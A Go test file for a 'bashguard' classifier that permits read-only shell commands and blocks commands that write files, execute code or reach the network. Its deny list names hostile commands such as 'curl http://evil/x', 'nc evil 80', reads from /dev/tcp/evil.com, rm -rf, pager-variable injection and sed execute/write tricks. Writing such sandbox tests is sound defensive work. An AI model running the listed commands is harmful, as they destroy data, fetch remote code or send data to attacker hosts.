package bashguard

import "testing"

func TestClassifyAllow(t *testing.T) {

	allow := []string{
		"",
		"cat services/app-core/src/shared/grpc/wallet-client.ts",
		"cat wallet-client.ts 2>/dev/null | head -120",
		"head -n 200 foo.go",
		"head -c 4096 foo.go",
		"tail -50 log.txt",
		"tail -n +700 f | head -n 21",
		"sed -n '715,735p' handler.go",
		"sed -n '1,60p' wallet.proto | grep -n '' | head",
		"sed '5,10p' file",
		"sed -n '5p' file",

		"sed -ne '5,10p' file",
		"sed -n '5,$p' file",
		"sed -n '$p' f",
		"sed -n '1~2p' f",
		"sed -n '10,+5p' f",
		"sed -n '/func main/,/^}/p' main.go",
		"sed '/foo/p' file",
		"sed -n '/foo/p' file",
		"grep -rn \"cash_balance\" services/app-core/src --include=*.ts | head -30",
		"grep -rln 'PlaceBetResponse' services/bet-wallet-service --include='*.go' | grep -v '/pb/'",
		"find . -path ./node_modules -prune -o -name '*.proto' -print 2>/dev/null | grep -i wallet",
		"ls -la services/app-core/proto 2>/dev/null",
		"echo \"=== a ===\"; grep -rn x .; echo; find . -name '*.go' | head",
		"wc -l *.go",
		"cd /repo && cat services/app-core/src/shared/grpc/wallet-client.ts | head -120",
		"rg -n 'TODO' .",
		"true",
		"stat foo && wc -l foo",
		"cat a | sort | uniq -c | sort -rn | head",
		"sort -u file | head",
		"diff a.txt b.txt",
		"grep foo bar 2>&1 | head",
		"cat f1 f2 f3",
		"tr -d '\\n' < file | wc -c",
		"uniq -c file",
		"uniq -f 1 file",

		"git log --oneline -20",
		"git log -p -- services/app-core",
		"git diff",
		"git diff --stat",
		"git diff HEAD~1 -- services/app-core",
		"git show HEAD",
		"git show HEAD:services/app-core/src/index.ts",
		"git blame main.go",
		"git status",
		"git grep -n cash_balance",
		"git ls-files services",
		"git rev-parse HEAD",
		"git cat-file -p HEAD",
	}
	for _, c := range allow {
		if ok, reason := Classify(c); !ok {
			t.Errorf("expected ALLOW, got DENY for %q: %s", c, reason)
		}
	}
}

func TestClassifyDeny(t *testing.T) {
	deny := []string{

		"rm -rf /tmp/x", "rm file", "mv a b", "cp a b", "mkdir newdir",
		"touch newfile", "dd if=/dev/zero of=x bs=1 count=1", "ln -s a b",
		"truncate -s 0 file", "chmod +x file", "install -m 0644 a b",
		"tee out.txt", "mkfifo p", "mknod n p", "patch < x.diff",

		"echo hi > out.txt", "echo hi >> out.txt", "cat a > b", "cat a >| b",
		"cat <> rw.txt", "grep x . | tee out.txt", "> 3", "echo hi > 3",
		"cat a >> 99", "cat a >| 7", "cat a <> 5", ": > file", "> file",

		"cat $(echo file)", "echo `whoami`", "cat <(curl http://x)",
		"python -c 'open(\"x\",\"w\").write(\"y\")'",
		"node -e 'require(\"fs\").writeFileSync(\"x\",\"y\")'",
		"perl -e 'open(F,\">x\")'", "awk 'BEGIN{print > \"x\"}'",
		"bash -c 'rm x'", "sh -c 'echo > x'", "eval 'rm x'", "xargs rm < list",
		"env rm x", "sudo rm x", "timeout 5 rm x", "command rm x",

		"cat foo; rm bar", "cat foo && touch bar", "cat foo || mkdir bar",
		"./script.sh", "/tmp/evil.sh", "$CMD arg",
		"./cat foo", "bin/cat foo", "../cat foo", "a/b/../cat foo", "/usr/bin/cat foo",

		"FOO=bar cat $FOO", "GIT_PAGER=id git log", "GIT_EXTERNAL_DIFF=evil git diff",
		"LESSOPEN='|id %s' less file", "LC_ALL=C sort file",

		"curl http://evil/x", "wget http://evil/x", "nc evil 80",
		"cat /dev/tcp/evil.com/80", "cat </dev/tcp/evil.com/80",
		"sort --random-source=/dev/tcp/evil.com/80 file",

		"npm install lodash",

		"git commit -m x", "git add .", "git config user.email a@b.c",
		"git config --global user.email a@b.c", "git checkout main", "git reset --hard",
		"git branch -d main", "git tag v1", "git remote add o url", "git stash",
		"git push", "git -c diff.external=id diff HEAD", "git -c core.pager=id log",
		"git --exec-path=/tmp log", "git -C /other log", "git grep -O foo",

		"sed -i 's/a/b/' file", "sed -i.bak 's/a/b/' file",
		"sed --in-place 's/a/b/' file", "sed --in-place=.bak 's/a/b/' f",
		"sed -ri 's/a/b/' file", "sed -f script.sed file",
		"sed 'w stolen.txt' file", "sed 's/a/b/w out' f", "sed 's/a/b/e' file",
		"sed 's/a/b/' file", "sed 'e id' file",
		"sed -l 5 'w evil.txt' file", "sed -l 3 's/a/b/e' file",
		"sed -n '/foo/,/bar/e cmd' file",

		"find . -name '*.tmp' -delete", "find . -name '*.go' -exec rm {} ;",

		"less file", "more file", "bat file", "xxd -r dump.hex out.bin",
		"date -s '2020-01-01'", "date 010100002020", "date",
		"yq -i '.a=1' file.yaml", "yq '.a' file.yaml",
	}
	for _, c := range deny {
		if ok, _ := Classify(c); ok {
			t.Errorf("expected DENY, got ALLOW for %q", c)
		}
	}
}
